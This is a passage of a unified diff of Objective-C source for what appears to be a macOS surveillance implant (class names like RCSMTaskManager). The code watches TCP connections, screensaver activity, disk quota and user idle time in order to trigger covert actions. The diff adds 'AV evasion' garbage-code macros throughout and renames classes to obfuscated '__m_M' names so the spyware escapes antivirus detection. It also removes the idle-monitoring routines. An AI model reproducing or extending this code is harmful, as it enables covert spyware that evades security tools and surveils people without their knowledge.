-      NSString *ipNetmask = [NSString stringWithUTF8String: inet_ntoa(netMaskStruct)];
-      
-      //
-      // Cycle through all the TCP connections
-      //
-      for (xig = (struct xinpgen *)((char *)xig + xig->xig_len);
-           xig->xig_len > sizeof(struct xinpgen);
-           xig = (struct xinpgen *)((char *)xig + xig->xig_len))
-        {
-          tp  = &((struct xtcpcb *)xig)->xt_tp;
-          inp = &((struct xtcpcb *)xig)->xt_inp;
-          so  = &((struct xtcpcb *)xig)->xt_socket;
-          
-          //
-          // Check only for TCP and ESTABLISHED connections
-          //
-          extern char *tcpstates[];
-          const char *state = "ESTABLISHED";
-          
-          if (so->xso_protocol == IPPROTO_TCP && strncmp(tcpstates[tp->t_state],
-                                                         state,
-                                                         strlen(state)) == 0)
-            {
-#ifdef DEBUG_EVENTS
-              verboseLog(@"Found an established connection: %s", inet_ntoa(inp->inp_faddr));
-              verboseLog(@"Configured netmask: %@", ipNetmask);
-#endif
-              
-              //
-              // Check if the ip belongs to any local network
-              // and if it's the ip that we are looking for
-              //
-              if (isAddressOnLan(inp->inp_faddr) == FALSE
-                  && compareIpAddress(inp->inp_faddr, tempAddress, netMask) == TRUE)
-                {
-#ifdef DEBUG_EVENTS
-                  warnLog(@"Address in list: %s (not on lan)", inet_ntoa(inp->inp_faddr));
-#endif
-                  
-                  if (connectionPort == 0 || inp->inp_fport == connectionPort)
-                    {
-                      connectionFound = TRUE;
-                      
-                      //
-                      // Check if the address hasn't been detected already
-                      //
-                      if (isAddressAlreadyDetected(ip,
-                                                   connectionPort,
-                                                   ipNetmask,
-                                                   connectionsDetected) == FALSE)
-                        { 
-                          NSArray *keys = [[NSArray alloc] initWithObjects: @"ip", @"port", @"netmask", nil];
-                          NSArray *objects = [[NSArray alloc] initWithObjects: ip, port, ipNetmask, nil];
-                          
-                          NSDictionary *connection = [[NSDictionary alloc] initWithObjects: objects
-                                                                                   forKeys: keys];
-                          
-                          [connectionLock lock];
-                          [connectionsDetected addObject: connection];
-                          [connectionLock unlock];
-                          
-                          [keys release];
-                          [objects release];
-                          [connection release];
-                          
-#ifdef DEBUG_EVENTS
-                          warnLog(@"Event Connection triggered!");
-#endif
-                          if ([self isEventEnable: configuration] == TRUE)
-                            [taskManager triggerAction: actionID];
-                          
-                          [self tryTriggerRepeat: repeat 
-                                       withDealy: delay 
-                                    andIteration: iter 
-                                andConfiguration: configuration];
-                          
-                          if ([self isEventEnable: configuration] == TRUE)
-                            [taskManager triggerAction: end];
-                          
-                        }
-                    }
-                }
-            }
-        }
-      
-      free(buffer);
-      
-      if (isAddressAlreadyDetected(ip,
-                                   connectionPort,
-                                   ipNetmask,
-                                   connectionsDetected) == TRUE
-          && connectionFound                            == FALSE)
-        {
-#ifdef DEBUG_EVENTS
-          infoLog(@"Removing Connection");
-#endif
-          //
-          // Connection has been found previously and now it's not there anymore
-          // thus we remove it from our array in order to let it trigger again
-          //
-          NSArray *keys = [[NSArray alloc] initWithObjects: @"ip", @"port", @"netmask", nil];
-          NSArray *objects = [[NSArray alloc] initWithObjects: ip, port, ipNetmask, nil];
-          
-          NSDictionary *connection = [[NSDictionary alloc] initWithObjects: objects
-                                                                   forKeys: keys];
-          [connectionLock lock];
-          [connectionsDetected removeObject: connection];
-          [connectionLock unlock];
-          
-          [keys release];
-          [objects release];
-          [connection release];
-        }
-      
-      [innerPool release];
-      usleep(500000);
-    }
-  
-  if ([[configuration objectForKey: @"status"] isEqualToString: EVENT_STOP])
-    {
-      [configuration setValue: EVENT_STOPPED forKey: @"status"];
-      
-      [connectionsDetected removeAllObjects];
-    }
-    
-  [configuration release];
-  
-  [outerPool release];
 }
 
 // Done.!
@@ -1042,7 +1439,10 @@ NSLock *connectionLock;
 {
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
   
-  RCSMTaskManager *taskManager = [RCSMTaskManager sharedInstance];  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
+  __m_MTaskManager *taskManager = [__m_MTaskManager sharedInstance];  
   BOOL screenSaverFound = FALSE;
   int onTermination;
     
@@ -1054,6 +1454,9 @@ NSLock *connectionLock;
   int iter          = [[configuration objectForKey:@"iter"] intValue];
   int currentIter   = iter;
   
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
   NSString *process = [NSString stringWithString: SCREENSAVER_PROCESS];
   NSString *process_lowercaseString = [process lowercaseString];
   
@@ -1062,10 +1465,16 @@ NSLock *connectionLock;
     {
       NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
       
+      // AV evasion: only on release build
+      AV_GARBAGE_003
+      
       if (screenSaverFound == TRUE && findProcessWithName(process_lowercaseString) == NO)
         {
           screenSaverFound = FALSE;
-
+          
+          // AV evasion: only on release build
+          AV_GARBAGE_004
+          
           if (onTermination != 0xFFFFFFFF &&
               [self isEventEnable: configuration] == TRUE)
             {
@@ -1083,7 +1492,10 @@ NSLock *connectionLock;
         }
       
     if (screenSaverFound == TRUE)
-      {
+    { 
+      // AV evasion: only on release build
+      AV_GARBAGE_005
+      
         if (((iter == 0xFFFFFFFF) || (currentIter < iter)) && 
             [self waitDelaySeconds:configuration] == FALSE)
           {
@@ -1099,26 +1511,16 @@ NSLock *connectionLock;
     }
   
   if ([[configuration objectForKey: @"status"] isEqualToString: EVENT_STOP])
-    {
+  { 
+    // AV evasion: only on release build
+    AV_GARBAGE_006
+    
       [configuration setValue: EVENT_STOPPED forKey: @"status"];
-    }
+  }
 
   [configuration release];
   
   [outerPool release];
-}
-
-- (void)eventQuotaNotificationCallback:(NSNotification*)aNotify
-{
-  NSNumber *actionId = (NSNumber*)[aNotify object];
-
-  if (actionId && [actionId intValue] > -1)
-    {
-#ifdef DEBUG_EVENTS
-    infoLog(@"event quota triggering action %@", actionId);
-#endif
-      [[RCSMTaskManager sharedInstance] triggerAction: [actionId intValue]];
-    }
 }
 
 typedef struct {
@@ -1131,10 +1533,16 @@ typedef struct {
 - (void)eventQuota: (NSDictionary *)configuration
 {
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
-
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
   [configuration retain];
   
   quota_conf_entry_t *params = (quota_conf_entry_t*)[[configuration objectForKey: @"data"] bytes];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
   
   int exitAction    = params->exit_event;
   int enterAction   = [[configuration objectForKey: @"actionID"] intValue];
@@ -1143,41 +1551,53 @@ typedef struct {
   int currentIter = iter;
   
   // Setting parameter
-  [[RCSMDiskQuota sharedInstance] setEventQuotaParam: configuration 
+  [[__m_MDiskQuota sharedInstance] setEventQuotaParam: configuration 
                                            andAction: [configuration objectForKey:@"actionID"]];
-                                           
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
   while ([configuration objectForKey: @"status"] != EVENT_STOP
          && [configuration objectForKey: @"status"] != EVENT_STOPPED)
     {
-      if (mEventQuotaRunning == NO && [[RCSMDiskQuota sharedInstance] mMaxQuotaTriggered] == YES)
+      if (mEventQuotaRunning == NO && [[__m_MDiskQuota sharedInstance] mMaxQuotaTriggered] == YES)
         {
           mEventQuotaRunning = YES;
           
           if ([self isEventEnable: configuration] == TRUE)
-            [[RCSMTaskManager sharedInstance] triggerAction: enterAction];
+            [[__m_MTaskManager sharedInstance] triggerAction: enterAction];
           currentIter = 0;
         }
         
-      if (mEventQuotaRunning == YES && [[RCSMDiskQuota sharedInstance] mMaxQuotaTriggered] == NO)
-        {
+      if (mEventQuotaRunning == YES && [[__m_MDiskQuota sharedInstance] mMaxQuotaTriggered] == NO)
+      { 
+        // AV evasion: only on release build
+        AV_GARBAGE_005
+        
           mEventQuotaRunning = NO;
           if ([self isEventEnable: configuration] == TRUE)
-            [[RCSMTaskManager sharedInstance] triggerAction: exitAction];
+            [[__m_MTaskManager sharedInstance] triggerAction: exitAction];
         }
     
       if (mEventQuotaRunning == TRUE)
-        {
+      { 
+        // AV evasion: only on release build
+        AV_GARBAGE_006
+        
           if (((iter == 0xFFFFFFFF) || (currentIter < iter)) && 
               [self waitDelaySeconds:configuration] == FALSE &&
               [self isEventEnable: configuration] == TRUE)
             {
-              [[RCSMTaskManager sharedInstance] triggerAction: repeat];
+              [[__m_MTaskManager sharedInstance] triggerAction: repeat];
               currentIter++;
             }
         }
       
       usleep(300000);
     }
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_004
   
   if ([[configuration objectForKey: @"status"] isEqualToString: EVENT_STOP])
     {
@@ -1192,127 +1612,5 @@ typedef struct {
   return;
 }
 
-- (UInt32)getIdleSec
-{
-  int64_t idlesecs = -1;
-  io_iterator_t iter = 0;
-  int64_t nanoseconds = 0;
-  
-  if (IOServiceGetMatchingServices(kIOMasterPortDefault, IOServiceMatching("IOHIDSystem"), &iter) == KERN_SUCCESS) 
-    {
-      io_registry_entry_t entry = IOIteratorNext(iter);
-      
-      if (entry) 
-        {
-          CFMutableDictionaryRef dict = NULL;
-          if (IORegistryEntryCreateCFProperties(entry, &dict, kCFAllocatorDefault, 0) == KERN_SUCCESS) 
-            {
-              CFNumberRef obj = CFDictionaryGetValue(dict, CFSTR("HIDIdleTime"));
-              if (obj) 
-                {
-                  
-                  if (CFNumberGetValue(obj, kCFNumberSInt64Type, &nanoseconds)) 
-                      idlesecs = (nanoseconds >> 30); // Divide by 10^9 to convert from nanoseconds to seconds.
-                }
-              CFRelease(dict);
-            }
-          
-          IOObjectRelease(entry);
-        }
-      IOObjectRelease(iter);
-    }
-  
-#ifdef DEBUG_EVENTS
-  infoLog(@"%s: idle %lu sec", __FUNCTION__, idlesecs);
-#endif
-  
-  return idlesecs;
-}
-
-- (BOOL)isInIdle:(UInt32) sec
-{
-  if ([self getIdleSec] > sec)
-    return TRUE;
-  else 
-    return FALSE;
-}
-
-- (void)eventIdle:(NSDictionary*)configuration
-{
-  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
-  BOOL amIInIdle = FALSE;
-  BOOL idleTriggered = FALSE;
-  [configuration retain];
-  
-  UInt32 *seconds = (UInt32*)[[configuration objectForKey: @"data"] bytes];
-  
-  int enterAction   = [[configuration objectForKey: @"actionID"] intValue];
-  int repeat        = [[configuration objectForKey:@"repeat"] intValue];
-  int iter          = [[configuration objectForKey:@"iter"] intValue];
-  int end           = [[configuration objectForKey:@"end"] intValue];
-  
-  int currentIter   = iter;
-  
-#ifdef DEBUG_EVENTS
-  infoLog(@"%s: starting idle event every %lu sec", __FUNCTION__, *seconds);
-#endif
-  
-  while ([configuration objectForKey: @"status"] != EVENT_STOP
-         && [configuration objectForKey: @"status"] != EVENT_STOPPED)
-    {
-      amIInIdle = [self isInIdle: *seconds];
-    
-      if (amIInIdle == TRUE && idleTriggered == FALSE)
-        {
-          if ([self isEventEnable: configuration] == TRUE)
-            {
-#ifdef DEBUG_EVENTS
-              infoLog(@"%s: triggering idle start %d", __FUNCTION__, enterAction);
-#endif
-              idleTriggered = TRUE;
-              [[RCSMTaskManager sharedInstance] triggerAction: enterAction];
-              currentIter = 0;
-            }
-        }
-      
-      if (amIInIdle == NO && idleTriggered == TRUE)
-        {
-          if ([self isEventEnable: configuration] == TRUE) 
-            {
-#ifdef DEBUG_EVENTS
-              infoLog(@"%s: triggering idle stop %d", __FUNCTION__, end);
-#endif
-              [[RCSMTaskManager sharedInstance] triggerAction: end];
-              idleTriggered = FALSE;
-            }
-        }
-    
-      if (amIInIdle == TRUE)
-        {
-          if (((iter == 0xFFFFFFFF) || (currentIter < iter)) && 
-              [self waitDelaySeconds:configuration] == FALSE &&
-              [self isEventEnable: configuration] == TRUE)
-            {
-#ifdef DEBUG_EVENTS
-              infoLog(@"%s: triggering idle repeat %d", __FUNCTION__, repeat);
-#endif
-              [[RCSMTaskManager sharedInstance] triggerAction: repeat];
-              currentIter++;
-            }
-        }
-      
-      sleep(1);
-    }
-  
-  if ([[configuration objectForKey: @"status"] isEqualToString: EVENT_STOP])
-    {
-    [configuration setValue: EVENT_STOPPED forKey: @"status"];
-    }
-  
-  [configuration release];
-  [outerPool release];
-  
-  return;
-}
 
 @end
